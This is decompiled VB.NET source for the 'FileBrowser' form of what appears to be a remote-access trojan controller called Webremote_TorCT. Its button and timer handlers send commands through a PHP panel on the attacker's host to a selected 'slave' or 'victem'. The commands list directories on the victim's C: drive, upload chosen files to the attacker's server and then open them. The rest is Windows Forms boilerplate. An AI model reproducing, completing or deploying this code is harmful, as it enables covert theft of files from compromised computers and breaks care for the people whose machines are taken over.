Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Webremote_TorCT_5_1.My

Namespace Webremote_TorCT_5_1
    <DesignerGenerated> _
    Public Class FileBrowser
        Inherits Form
        ' Methods
        Public Sub New()
            AddHandler MyBase.FormClosing, New FormClosingEventHandler(AddressOf Me.FileBrowser_FormClosing)
            AddHandler MyBase.Load, New EventHandler(AddressOf Me.FileBrowser_Load)
            Dim list As List(Of WeakReference) = FileBrowser.__ENCList
            SyncLock list
                FileBrowser.__ENCList.Add(New WeakReference(Me))
            End SyncLock
            Me.SendCommand = New WebClient
            Me.InitializeComponent
        End Sub

        Private Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFN.php?Function=Filemanager747:" & Me.TextBox2.Text & MyProject.Forms.Client.Strvictem.ToString))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
                Me.Timer1.Start
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        Private Sub Button2_Click(ByVal sender As Object, ByVal e As EventArgs)
            Try 
                Me.SendCommand.DownloadString(String.Concat(New String() { MyProject.Forms.Client.HostName.ToString, "/AddFN.php?Function=GetFileToHost747:", Me.TextBox4.Text, Me.TextBox3.Text, MyProject.Forms.Client.Strvictem.ToString }))
                Interaction.MsgBox("sended to server", MsgBoxStyle.ApplicationModal, Nothing)
                Me.Timer2.Start
                Interaction.MsgBox("It Wil take Some time, Please Wait", MsgBoxStyle.ApplicationModal, Nothing)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                Interaction.MsgBox("ERROR: Could't send action", MsgBoxStyle.ApplicationModal, Nothing)
                ProjectData.ClearProjectError
            End Try
        End Sub

        <DebuggerNonUserCode> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try 
                If (disposing AndAlso (Not Me.components Is Nothing)) Then
                    Me.components.Dispose
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub

        Private Sub FileBrowser_FormClosing(ByVal sender As Object, ByVal e As FormClosingEventArgs)
            Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/AddFNDir.php?Dir=."))
        End Sub

        Private Sub FileBrowser_Load(ByVal sender As Object, ByVal e As EventArgs)
            If (MyProject.Forms.Client.SelectedV.ToString = "&SpecialUser=False") Then
                Interaction.MsgBox("Please select one slave!", MsgBoxStyle.ApplicationModal, Nothing)
                Me.Close
            End If
        End Sub

        <DebuggerStepThrough> _
        Private Sub InitializeComponent()
            Me.components = New Container
            Dim manager As New ComponentResourceManager(GetType(FileBrowser))
            Me.TextBox4 = New TextBox
            Me.Label3 = New Label
            Me.Label2 = New Label
            Me.Button2 = New Button
            Me.TextBox3 = New TextBox
            Me.Button1 = New Button
            Me.TextBox2 = New TextBox
            Me.TextBox1 = New TextBox
            Me.Timer1 = New Timer(Me.components)
            Me.Timer2 = New Timer(Me.components)
            Me.SuspendLayout
            Dim point As New Point(&H16B, &H55)
            Me.TextBox4.Location = point
            Me.TextBox4.Name = "TextBox4"
            Dim size As New Size(&H7B, 20)
            Me.TextBox4.Size = size
            Me.TextBox4.TabIndex = &H10
            Me.TextBox4.Text = "C:\"
            Me.Label3.AutoSize = True
            point = New Point(&H16B, &H45)
            Me.Label3.Location = point
            Me.Label3.Name = "Label3"
            size = New Size(80, 13)
            Me.Label3.Size = size
            Me.Label3.TabIndex = 15
            Me.Label3.Text = "Download File :"
            Me.Label2.AutoSize = True
            point = New Point(&H16B, 15)
            Me.Label2.Location = point
            Me.Label2.Name = "Label2"
            size = New Size(&H58, 13)
            Me.Label2.Size = size
            Me.Label2.TabIndex = 14
            Me.Label2.Text = "Get Files In Path:"
            point = New Point(&H24A, &H55)
            Me.Button2.Location = point
            Me.Button2.Name = "Button2"
            size = New Size(&H4B, &H17)
            Me.Button2.Size = size
            Me.Button2.TabIndex = 13
            Me.Button2.Text = "Get file"
            Me.Button2.UseVisualStyleBackColor = True
            point = New Point(&H1EC, &H55)
            Me.TextBox3.Location = point
            Me.TextBox3.Name = "TextBox3"
            size = New Size(&H58, 20)
            Me.TextBox3.Size = size
            Me.TextBox3.TabIndex = 12
            Me.TextBox3.Text = "FileName.exe"
            point = New Point(&H24A, &H21)
            Me.Button1.Location = point
            Me.Button1.Name = "Button1"
            size = New Size(&H4B, &H17)
            Me.Button1.Size = size
            Me.Button1.TabIndex = 11
            Me.Button1.Text = "Get files"
            Me.Button1.UseVisualStyleBackColor = True
            point = New Point(&H16B, &H21)
            Me.TextBox2.Location = point
            Me.TextBox2.Name = "TextBox2"
            size = New Size(&HD9, 20)
            Me.TextBox2.Size = size
            Me.TextBox2.TabIndex = 10
            Me.TextBox2.Text = "C:\"
            point = New Point(12, 12)
            Me.TextBox1.Location = point
            Me.TextBox1.Multiline = True
            Me.TextBox1.Name = "TextBox1"
            Me.TextBox1.ScrollBars = ScrollBars.Vertical
            size = New Size(&H159, &H179)
            Me.TextBox1.Size = size
            Me.TextBox1.TabIndex = 9
            Me.Timer1.Interval = &H2710
            Me.Timer2.Interval = &H2710
            Dim ef As New SizeF(6!, 13!)
            Me.AutoScaleDimensions = ef
            Me.AutoScaleMode = AutoScaleMode.Font
            size = New Size(&H29F, 400)
            Me.ClientSize = size
            Me.Controls.Add(Me.TextBox4)
            Me.Controls.Add(Me.Label3)
            Me.Controls.Add(Me.Label2)
            Me.Controls.Add(Me.Button2)
            Me.Controls.Add(Me.TextBox3)
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.TextBox2)
            Me.Controls.Add(Me.TextBox1)
            Me.FormBorderStyle = FormBorderStyle.FixedSingle
            Me.Icon = DirectCast(manager.GetObject("$this.Icon"), Icon)
            Me.MaximizeBox = False
            Me.MinimizeBox = False
            Me.Name = "FileBrowser"
            Me.Text = "FileBrowser"
            Me.ResumeLayout(False)
            Me.PerformLayout
        End Sub

        Private Sub Timer1_Tick(ByVal sender As Object, ByVal e As EventArgs)
            If Not ((Me.TextBox1.Text = Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/FnDir.txt"))) Or (Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/FnDir.txt")) = ".")) Then
                Me.TextBox1.Text = Me.SendCommand.DownloadString((MyProject.Forms.Client.HostName.ToString & "/FnDir.txt"))
                Me.Timer1.Stop
            End If
        End Sub

        Private Sub Timer2_Tick(ByVal sender As Object, ByVal e As EventArgs)
            Process.Start((MyProject.Forms.Client.HostName.ToString & "/Upload/" & Me.TextBox3.Text))
            Me.Timer2.Stop
        End Sub


        ' Properties
        Friend Overridable Property Button1 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button1_Click)
                If (Not Me._Button1 Is Nothing) Then
                    RemoveHandler Me._Button1.Click, handler
                End If
                Me._Button1 = WithEventsValue
                If (Not Me._Button1 Is Nothing) Then
                    AddHandler Me._Button1.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Button2 As Button
            <DebuggerNonUserCode> _
            Get
                Return Me._Button2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Button)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Button2_Click)
                If (Not Me._Button2 Is Nothing) Then
                    RemoveHandler Me._Button2.Click, handler
                End If
                Me._Button2 = WithEventsValue
                If (Not Me._Button2 Is Nothing) Then
                    AddHandler Me._Button2.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property Label2 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Label3 As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Label3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Label)
                Me._Label3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox1 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox1 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox2 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox2 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox3 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox3 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property TextBox4 As TextBox
            <DebuggerNonUserCode> _
            Get
                Return Me._TextBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As TextBox)
                Me._TextBox4 = WithEventsValue
            End Set
        End Property

        Friend Overridable Property Timer1 As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._Timer1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer1_Tick)
                If (Not Me._Timer1 Is Nothing) Then
                    RemoveHandler Me._Timer1.Tick, handler
                End If
                Me._Timer1 = WithEventsValue
                If (Not Me._Timer1 Is Nothing) Then
                    AddHandler Me._Timer1.Tick, handler
                End If
            End Set
        End Property

        Friend Overridable Property Timer2 As Timer
            <DebuggerNonUserCode> _
            Get
                Return Me._Timer2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal WithEventsValue As Timer)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Timer2_Tick)
                If (Not Me._Timer2 Is Nothing) Then
                    RemoveHandler Me._Timer2.Tick, handler
                End If
                Me._Timer2 = WithEventsValue
                If (Not Me._Timer2 Is Nothing) Then
                    AddHandler Me._Timer2.Tick, handler
                End If
            End Set
        End Property


        ' Fields
        Private Shared __ENCList As List(Of WeakReference) = New List(Of WeakReference)
        <AccessedThroughProperty("Button1")> _
        Private _Button1 As Button
        <AccessedThroughProperty("Button2")> _
        Private _Button2 As Button
        <AccessedThroughProperty("Label2")> _
        Private _Label2 As Label
        <AccessedThroughProperty("Label3")> _
        Private _Label3 As Label
        <AccessedThroughProperty("TextBox1")> _
        Private _TextBox1 As TextBox
        <AccessedThroughProperty("TextBox2")> _
        Private _TextBox2 As TextBox
        <AccessedThroughProperty("TextBox3")> _
        Private _TextBox3 As TextBox
        <AccessedThroughProperty("TextBox4")> _
        Private _TextBox4 As TextBox
        <AccessedThroughProperty("Timer1")> _
        Private _Timer1 As Timer
        <AccessedThroughProperty("Timer2")> _
        Private _Timer2 As Timer
        Private components As IContainer
        Private SendCommand As WebClient
    End Class
End Namespace

